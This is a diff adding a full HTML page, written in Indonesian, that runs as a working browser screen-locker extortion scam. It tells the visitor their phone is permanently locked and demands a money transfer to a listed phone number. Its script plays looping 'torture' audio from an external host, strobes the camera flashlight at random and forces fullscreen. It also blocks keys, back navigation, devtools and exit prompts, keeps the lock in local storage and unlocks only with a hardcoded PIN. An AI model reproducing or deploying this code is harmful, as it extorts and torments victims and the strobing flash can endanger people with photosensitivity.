@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
+    <title>⚠️ SYSTEM FAILURE ⚠️</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .lockdown-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000000;
+            z-index: 2147483647;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', 'Segoe UI', monospace;
+        }
+
+        .glitch-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, rgba(0,255,0,0.05) 0px, rgba(255,0,255,0.05) 2px, transparent 2px, transparent 6px);
+            pointer-events: none;
+            z-index: 2147483646;
+            animation: glitchShift 0.12s infinite;
+        }
+
+        @keyframes glitchShift {
+            0% { transform: translate(0); opacity: 0.4; }
+            25% { transform: translate(-3px, 1px); opacity: 0.7; }
+            50% { transform: translate(3px, -1px); opacity: 0.5; }
+            75% { transform: translate(-1px, 2px); opacity: 0.8; }
+            100% { transform: translate(1px, -2px); opacity: 0.4; }
+        }
+
+        .glitch-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, transparent 50%, rgba(255,0,0,0.3) 100%);
+            pointer-events: none;
+            z-index: 2147483646;
+            mix-blend-mode: overlay;
+            animation: flicker 0.05s infinite;
+        }
+
+        @keyframes flicker {
+            0% { opacity: 0.3; }
+            50% { opacity: 0.7; }
+            100% { opacity: 0.3; }
+        }
+
+        .lockdown-container {
+            text-align: center;
+            padding: 2rem;
+            max-width: 400px;
+            width: 90%;
+            z-index: 2147483647;
+            background: rgba(0,0,0,0.9);
+            border-radius: 2rem;
+            border: 2px solid #ff00aa;
+            box-shadow: 0 0 30px rgba(255,0,255,0.5);
+            animation: borderPulse 0.8s infinite;
+        }
+
+        @keyframes borderPulse {
+            0% { border-color: #ff00aa; box-shadow: 0 0 10px #ff00aa; }
+            50% { border-color: #00ffaa; box-shadow: 0 0 40px #00ffaa; }
+            100% { border-color: #ff00aa; box-shadow: 0 0 10px #ff00aa; }
+        }
+
+        .lock-icon {
+            font-size: 4rem;
+            animation: shakeGlitch 0.2s infinite;
+        }
+
+        @keyframes shakeGlitch {
+            0% { transform: translate(0); text-shadow: 3px 0 red; }
+            25% { transform: translate(-4px, 2px); text-shadow: -3px 0 cyan; }
+            50% { transform: translate(4px, -2px); text-shadow: 3px 0 magenta; }
+            75% { transform: translate(-2px, 3px); text-shadow: -3px 0 lime; }
+            100% { transform: translate(0); text-shadow: 3px 0 red; }
+        }
+
+        h1 {
+            color: #ff3366;
+            font-size: 1.5rem;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            font-family: monospace;
+        }
+
+        .warning-text {
+            color: #ffaa44;
+            background: rgba(255, 170, 68, 0.2);
+            padding: 12px;
+            border-radius: 8px;
+            margin: 1rem 0;
+            font-size: 0.8rem;
+            font-family: monospace;
+            border-left: 3px solid #ffaa44;
+            animation: textGlitch 0.4s infinite;
+        }
+
+        @keyframes textGlitch {
+            0% { opacity: 1; text-shadow: 2px 0 red; }
+            50% { opacity: 0.8; text-shadow: -2px 0 blue; }
+            100% { opacity: 1; text-shadow: 2px 0 red; }
+        }
+
+        .pin-display {
+            background: #0a0a0a;
+            padding: 15px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            font-size: 2rem;
+            letter-spacing: 12px;
+            font-family: monospace;
+            color: #00ffcc;
+            text-align: center;
+            border: 1px solid #ff00ff;
+        }
+
+        .pin-pad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .pin-btn {
+            background: #111;
+            border: 1px solid #ff00aa;
+            color: #0ff;
+            font-size: 1.8rem;
+            padding: 18px;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.05s linear;
+            font-weight: bold;
+            font-family: monospace;
+        }
+
+        .pin-btn:active {
+            background: #ff00aa;
+            color: black;
+            transform: scale(0.95);
+        }
+
+        .submit-btn {
+            background: linear-gradient(135deg, #ff0066, #6600ff);
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 60px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: white;
+            margin-top: 15px;
+            cursor: pointer;
+            font-family: monospace;
+        }
+
+        .error-msg {
+            color: #ff5555;
+            margin-top: 15px;
+            font-size: 0.8rem;
+            background: #220000;
+            padding: 8px;
+            border-radius: 20px;
+            font-family: monospace;
+        }
+
+        .attempt-counter {
+            margin-top: 20px;
+            color: #ff6699;
+            font-size: 0.7rem;
+        }
+
+        audio {
+            display: none;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 0;
+            height: 0;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+<audio id="tortureSound" loop autoplay preload="auto" crossorigin="anonymous">
+    <source src="https://files.catbox.moe/748vcj.mp3" type="audio/mpeg">
+</audio>
+
+<div id="lockScreen" class="lockdown-overlay">
+    <div class="glitch-bg"></div>
+    <div class="glitch-overlay"></div>
+    <div class="lockdown-container">
+        <div class="lock-icon">😈💀🔊💀😈</div>
+        <h1>YOUR PHONE IS LOCKED</h1>
+        <div class="warning-text">
+            ⚠️ HP ANDA TELAH DIKUNCI PERMANEN ⚠️<br>
+            LOCKED BY @MUTZXD<br>
+            TF 25K KE 085921018213<br>
+            AGAR BISA DI BUKA<br>
+            <span style="color:red">⚡ FLASH + SUARA TORTURE AKTIF ⚡</span><br>
+            <span style="color:red">RESTART TIDAK AKAN MEMBANTUKAN!</span>
+        </div>
+        
+        <div class="pin-input-area">
+            <div class="pin-display" id="pinDisplay">●●●●●●</div>
+            <div class="pin-pad" id="pinPad"></div>
+            <button class="submit-btn" id="unlockBtn">🔓 FORCED UNLOCK</button>
+            <div id="errorMsg" class="error-msg"></div>
+            <div class="attempt-counter">⚡ PERCOBAAN: <span id="attemptLeft">5</span> ⚡</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function() {
+        // ========================
+        // KONFIGURASI
+        // ========================
+        const CORRECT_PIN = "190563";
+        let MAX_ATTEMPTS = 5;
+        let currentAttempts = 0;
+        let enteredPin = "";
+        
+        const LOCK_KEY = "ZEN0_LOCKDOWN_ACTIVE";
+        const ATTEMPTS_KEY = "ZEN0_ATTEMPTS";
+        
+        // ========================
+        // AUDIO TORTURE
+        // ========================
+        let audioElement = document.getElementById('tortureSound');
+        
+        function forcePlayAudio() {
+            if (audioElement) {
+                audioElement.volume = 1.0;
+                audioElement.loop = true;
+                audioElement.play().catch(e => {
+                    document.body.addEventListener('click', function playOnce() {
+                        audioElement.play();
+                        document.body.removeEventListener('click', playOnce);
+                    }, { once: true });
+                });
+            }
+        }
+        
+        function maintainAudio() {
+            if (audioElement && (audioElement.paused || audioElement.ended)) {
+                audioElement.play().catch(()=>{});
+            }
+        }
+        setInterval(maintainAudio, 500);
+        
+        // ========================
+        // FLASH CONTROL
+        // ========================
+        let flashTrack = null;
+        let flashInterval = null;
+        
+        async function initFlash() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                const track = stream.getVideoTracks()[0];
+                if (track.getCapabilities().torch) {
+                    flashTrack = track;
+                    startRandomFlash();
+                }
+            } catch (err) {}
+        }
+        
+        function setFlash(on) {
+            if (flashTrack) {
+                flashTrack.applyConstraints({ advanced: [{ torch: on }] }).catch(()=>{});
+            }
+        }
+        
+        function startRandomFlash() {
+            if (flashInterval) clearInterval(flashInterval);
+            flashInterval = setInterval(() => {
+                setTimeout(() => {
+                    if (flashTrack) {
+                        const state = Math.random() > 0.5;
+                        setFlash(state);
+                        if (state) {
+                            setTimeout(() => setFlash(false), Math.random() * 1500 + 500);
+                        }
+                    }
+                }, Math.random() * 2000);
+            }, 3000);
+        }
+        
+        function stopFlash() {
+            if (flashInterval) clearInterval(flashInterval);
+            if (flashTrack) {
+                setFlash(false);
+                flashTrack.stop();
+                flashTrack = null;
+            }
+        }
+        
+        // ========================
+        // PERSISTENT LOCK
+        // ========================
+        function isPersistentLockActive() {
+            return localStorage.getItem(LOCK_KEY) === "true";
+        }
+        
+        function setPersistentLock(status) {
+            if(status) {
+                localStorage.setItem(LOCK_KEY, "true");
+                localStorage.setItem(ATTEMPTS_KEY, currentAttempts.toString());
+            } else {
+                localStorage.removeItem(LOCK_KEY);
+                localStorage.removeItem(ATTEMPTS_KEY);
+            }
+        }
+        
+        function loadPersistentAttempts() {
+            let saved = localStorage.getItem(ATTEMPTS_KEY);
+            if(saved !== null) {
+                currentAttempts = parseInt(saved);
+                document.getElementById('attemptLeft').innerText = MAX_ATTEMPTS - currentAttempts;
+            }
+        }
+        
+        // ========================
+        // TOTAL SILENT LOCKDOWN - TANPA POPUP
+        // ========================
+        function enableTotalLockdown() {
+            document.body.style.overflow = "hidden";
+            document.body.style.position = "fixed";
+            document.body.style.width = "100%";
+            document.body.style.height = "100%";
+            
+            function requestFullscreenForce() {
+                const docEl = document.documentElement;
+                if (docEl.requestFullscreen) docEl.requestFullscreen().catch(()=>{});
+                else if (docEl.webkitRequestFullscreen) docEl.webkitRequestFullscreen();
+            }
+            requestFullscreenForce();
+            
+            setInterval(() => {
+                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                    requestFullscreenForce();
+                }
+            }, 1000);
+            
+            // SILENT RELOAD - tanpa popup, tanpa notifikasi
+            setInterval(() => {
+                if (document.hidden) {
+                    setTimeout(() => { location.replace(location.href); }, 50);
+                }
+            }, 200);
+            
+            // BLOCK semua key
+            document.addEventListener('keydown', function(e) {
+                const blocked = ['F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12',
+                    'Home','End','Escape','VolumeUp','VolumeDown','Power','Backspace'];
+                if(blocked.includes(e.key) || (e.ctrlKey && e.shiftKey) || e.key === 'Escape' ||
+                    e.key === 'F5' || (e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.key === 'R')) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+            });
+            
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+            
+            document.addEventListener('keydown', (e) => {
+                if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) || (e.ctrlKey && e.key === 'u')) {
+                    e.preventDefault();
+                }
+            });
+            
+            // BLOCK history back - tanpa popup
+            history.pushState(null, null, location.href);
+            window.addEventListener('popstate', function() {
+                history.pushState(null, null, location.href);
+                location.replace(location.href);
+            });
+            setInterval(() => {
+                history.pushState(null, null, location.href);
+            }, 200);
+            
+            // HAPUS POPUP beforeunload - ini kunci utamanya
+            window.removeEventListener('beforeunload', () => {});
+            // Override biar ga ada yang bisa pasang beforeunload
+            window.addEventListener('beforeunload', function(e) {
+                // GA ADA RETURN STRING -> GA ADA POPUP
+                e.preventDefault();
+                // Kosongin returnValue biar ga muncul dialog
+                delete e.returnValue;
+                return null;
+            });
+            
+            // Blokir swipe back
+            let touchStartX = 0;
+            document.addEventListener('touchstart', (e) => { touchStartX = e.touches[0].clientX; });
+            document.addEventListener('touchend', (e) => {
+                let endX = e.changedTouches[0].clientX;
+                if(endX - touchStartX > 80) {
+                    e.preventDefault();
+                    location.replace(location.href);
+                }
+            });
+            
+            setInterval(() => { debugger; }, 300);
+        }
+        
+        // ========================
+        // GLITCH RANDOM
+        // ========================
+        function addRandomGlitch() {
+            const glitchDiv = document.createElement('div');
+            glitchDiv.style.position = 'fixed';
+            glitchDiv.style.top = Math.random() * 100 + '%';
+            glitchDiv.style.left = Math.random() * 100 + '%';
+            glitchDiv.style.width = '80px';
+            glitchDiv.style.height = '15px';
+            glitchDiv.style.background = 'rgba(255,0,255,0.6)';
+            glitchDiv.style.zIndex = '999999999';
+            glitchDiv.style.pointerEvents = 'none';
+            document.body.appendChild(glitchDiv);
+            setTimeout(() => glitchDiv.remove(), 80);
+        }
+        setInterval(addRandomGlitch, 200);
+        
+        // ========================
+        // PIN LOGIC
+        // ========================
+        function updatePinDisplay() {
+            const display = document.getElementById('pinDisplay');
+            let masked = "";
+            for(let i = 0; i < enteredPin.length; i++) masked += "●";
+            while(masked.length < 6) masked += "○";
+            display.innerText = masked.substring(0,6);
+        }
+        
+        function generatePinPad() {
+            const pad = document.getElementById('pinPad');
+            const btns = ['1','2','3','4','5','6','7','8','9','⌫','0','✓'];
+            pad.innerHTML = '';
+            btns.forEach(b => {
+                const btn = document.createElement('button');
+                btn.className = 'pin-btn';
+                btn.innerText = b;
+                btn.onclick = (e) => {
+                    e.preventDefault();
+                    if(currentAttempts >= MAX_ATTEMPTS) return;
+                    if(b === '⌫') {
+                        enteredPin = enteredPin.slice(0,-1);
+                        updatePinDisplay();
+                    } else if(b === '✓') {
+                        attemptUnlock();
+                    } else {
+                        if(enteredPin.length < 6) {
+                            enteredPin += b;
+                            updatePinDisplay();
+                            if(enteredPin.length === 6) attemptUnlock();
+                        }
+                    }
+                };
+                pad.appendChild(btn);
+            });
+        }
+        
+        function attemptUnlock() {
+            if(currentAttempts >= MAX_ATTEMPTS) {
+                document.getElementById('errorMsg').innerHTML = "💀 LOCKDOWN PERMANEN! HUBUNGI @MUTZXD 💀";
+                return;
+            }
+            if(enteredPin.length !== 6) {
+                document.getElementById('errorMsg').innerText = "❌ HARUS 6 DIGIT!";
+                return;
+            }
+            if(enteredPin === CORRECT_PIN) {
+                if (audioElement) {
+                    audioElement.pause();
+                    audioElement.currentTime = 0;
+                }
+                stopFlash();
+                localStorage.removeItem(LOCK_KEY);
+                localStorage.removeItem(ATTEMPTS_KEY);
+                document.getElementById('errorMsg').style.color = "#0f0";
+                document.getElementById('errorMsg').innerHTML = "✅ UNLOCKED! KELUAR DARI APLIKASI... ✅";
+                
+                setTimeout(() => {
+                    window.open('', '_self').close();
+                    location.href = 'about:blank';
+                    window.close();
+                }, 300);
+            } else {
+                currentAttempts++;
+                let left = MAX_ATTEMPTS - currentAttempts;
+                document.getElementById('attemptLeft').innerText = left;
+                enteredPin = "";
+                updatePinDisplay();
+                document.getElementById('errorMsg').innerHTML = `❌ PIN SALAH! SISA ${left} PERCOBAAN ❌`;
+                if(navigator.vibrate) navigator.vibrate(400);
+                
+                setPersistentLock(true);
+                
+                if(left === 0) {
+                    document.querySelector('.pin-pad').style.pointerEvents = "none";
+                    document.getElementById('unlockBtn').disabled = true;
+                    document.getElementById('errorMsg').innerHTML = "🔒 LOCKDOWN PERMANEN! SUARA + FLASH TERUS 🔒";
+                }
+            }
+        }
+        
+        // ========================
+        // INITIALIZE
+        // ========================
+        function init() {
+            generatePinPad();
+            updatePinDisplay();
+            enableTotalLockdown();
+            
+            forcePlayAudio();
+            initFlash();
+            
+            if(isPersistentLockActive()) {
+                loadPersistentAttempts();
+                if(currentAttempts >= MAX_ATTEMPTS) {
+                    document.querySelector('.pin-pad').style.pointerEvents = "none";
+                    document.getElementById('unlockBtn').disabled = true;
+                }
+            }
+            
+            document.getElementById('attemptLeft').innerText = MAX_ATTEMPTS - currentAttempts;
+            document.getElementById('unlockBtn').addEventListener('click', attemptUnlock);
+        }
+        
+        init();
+    })();
+</script>
+</body>
+</html>
